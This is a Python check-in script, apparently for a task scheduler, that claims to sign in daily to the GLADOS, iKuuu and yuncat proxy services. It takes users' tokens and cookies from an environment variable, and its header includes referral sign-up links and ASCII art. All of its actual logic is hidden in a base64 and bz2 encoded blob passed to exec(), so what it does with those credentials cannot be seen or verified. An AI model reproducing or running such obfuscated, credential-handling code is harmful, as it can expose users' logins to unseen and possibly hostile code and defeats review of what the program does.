# --encoding:utf-8 -- #
"""
    
    联系方式:110

    飞机

    #'''''''''' 更新日志 '''''''''''

    ver 1.2

    2024.7.26
    
    修复ikuuu无法签到 暂时无法使用

    2024.6.30

    实现 GLADOS、iKuuu yuncat 每日签到和续费

    #'''''' 设置 ''''''

    环境变量:yuanshen_fj

    GLADOS 注册地址 (需要飞机
    https://glados.space/

    iKuuu 注册地址 (需要飞机
    https://ikuuu.pw/auth/register?code=CXcm

    yuncat 注册地址 (不需要飞机
    https://yun.cat/register?aff=ZLc9BNuZ
    
    参数：
        GLADOS 的 token和cookie
        iKuuu 的 cookie
        yuncat 的 cookie

    有不需要的机场 参数只需用""略过 例如：#""#
    格式 export yuanshen_fj=备注#Glatoken#Glacookie#iKuuu_cookie#Yuncat_cookie

    定时 每天9点一次
    cron: 0 0 9 * * ? 

"""

#   --------------------------------一般不动区--------------------------------
#
#                                               #v;;@
#                                           .8@;;;3;;;;&@@u
#                                     ##%$$$$;;;*n8;;$;;;~&$$$$$@&          3@
#                                +@$%$$$$$$$%!;;;%;a$%*;;#$$$$%$$$$%$@!    *n *@n
#                              &$$$$$$$$$$$$$@*;;;$;;;;;@$$%$$$$$$$$$$%$$@%
#                             $$$$$$$$$$$$$$$$;;;;8;;;;$$$$$$$$i#$$%3i!@i@$$@
#                             #$$$$$$$$$$$$$$%$&&&#@@@@$$$$$$$#!!i#%#i!i3#$$$%&.&$
#                             @$$$$$$$$$$$$&@@@@@@@@&$$$$$$$$$%$!6@@iii6!!@@$@$$&.
#                          +&$%$@@@6iiiiizzzzuzzzzzazzzazzui!@@&%$$$$&i%$#@!i@%$$@
#                        #@@&&iiizzuazzaazzz@zzaazaaazazzzzaazzzzii#@$$$$$ii!i!$$%+
#                      @&&&@@uzzzzaazzzzzzi8zzzzazzazazaaizzzzazazzzaiii@$#!#i###
#                      @&&i#zzzazazzizi#@@6^izzzzzaazazu$izazzazzzzzaaz1iii8#$#@%%
#                      +i@zzzaazz11zzi!@+-%3zaaza1zzzi!#iaazz68zzzzzzzzz1iii&&#i$@
#                       i#1zazzza@azi38++. ;iuzzziazz8++*6azzzzzzzzzzzazazzii6&$&$.
#        .3       @    #i@zzzzaa3i@@3     .@&izzziu1#-- -@&###azuuzzaazzzzazzi&&# %^
#       z-i!*       a  ii@azzzzz@-6  @@@@   &@izz%#8- +8   $@3  &!azzzzzaaazzz@   -$#
#      o   !!1  -o  @+!8 @izaazz@ @  *&1    % %iaa#8  #   @@@@~  @izazzzaazzzzi    &$~
#     6    iii      3    .i1auaa! %        +o  -@i%.  @          @;$zazzzzzzaza    @%$.
#     n            !      #!iziiz@  %#;..8$        .  .@        @.a#zzaazzizzz%     $$@
#   * ^            #      va@ii3!ia$  ..                 ;&@@@1   %zzaaaaiizaz@
# ~;% ;           ~ #     @aaaz@#  ......     3           ....   $zzzza1i86azz#    za.@ 6
#     #          a .@@@   &aaaa@               -&@!       .... -6uiiizi#ai@izau    3z @;
#      ~         #        +uuuu!@                             ^++oiii%3-&1i&azz@   61~  &
#      -~        @         @uuu!-i63..                         $#@i+--%3iia!#izzu      * .
#        n       o          &311#iiiii@!                    .---o@#iii%aaaz-   i@&&^
#         @~      @          !31u@ii#i$&@@8!3#;-------++-1##3@ 8@.!iii1aaa&
#           #~;    !      #$#@%336$%#8@%%$$#&63i3n  @!!6668#&$$$$#!ii#aauu#
#        ..   +8~~~;;@@@&.@3#&$&%%#$&8888%&$$%$$%@&$$$$$$$$$$$@88888#uuuu$$-
#             .   .-%   6~@%$$8#$#$$88888888&#$#&a6%$%$#@8888888888@113u@$$$$
#                   1    -z$$$$6366%$%$&%88888&#&u;~;86686686%v%@611!3&$$$$#z  ;u
#                    1--+#^@$$$6$8#%aaai$668688;$&66668686688% a!338&$$$$$v.  .^@
#                      @@@@@$&#@ ^u%!uu%%88866$@#&8666686668%&   -a$&$$$@.  8@#
#                        $&##     @##816666666868#8666666366&$.   3u%$%@&8;*@ %@
#            @   @                 %#@366368$$@66866666666636&;&  @u%3$@#u$u-  o&
#       @ @. @ -v8i%               !6336666663&6666636!66336!66z~  @~#!11uuui1   #
#       @ @  @  @ @               #&&@663666$va$6666!33666666#&$%@  # @!1u33$6!!$  @
#       @ @ @.  @ @   @@@@- @&   @&$@1&6!636a$@1%6663!3333&$z1$$$$@@    +#838#!&v3   v
#       @@@ @ 8 -a@              @%$;&i$&666#n6%;3#3336@&&**#;#$$$#6za    .3$3131 -
#       n -@ @@ i@@.             #$@~%8$$$&@on@@@@$v&$%$$$$$$3n$$&iz%%a&     o33#
#              @   +            +&&@a&$$$%$$ou$$$$$&&~~$$$$1$@;$$&#%%z868$@@!;#3-
#                                v   .@&&$$$&$#%%%&@#&$&$$$$$&;#@@@&%$#%&@   %8u!
#                             !%&       #$&#ou6%!%#  .#&$$$$@       1 @$^
#                            a@ .i-i+ . ^&%%33!8%%%     #&&+       !1@#8@
#                            @$6-@  i#&    -8@@@@#@#^     @&^     %n*!@.
#                           &$$++i$
#                             .@$$%$
#
# ...................................................................
#           堂主保佑             永无BUG
#           堂主镇楼             BUG辟邪
#
#   堂主曰:
#
#        一日复一日，代码何其多！
#        只愿无bug，每日醉成仙！
#
# --------------------------------代码区--------------------------------

try:
  import bz2, base64
  exec(bz2.decompress(base64.b64decode('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')))
except Exception as e:
  print('脚本执行出错:',str(e))
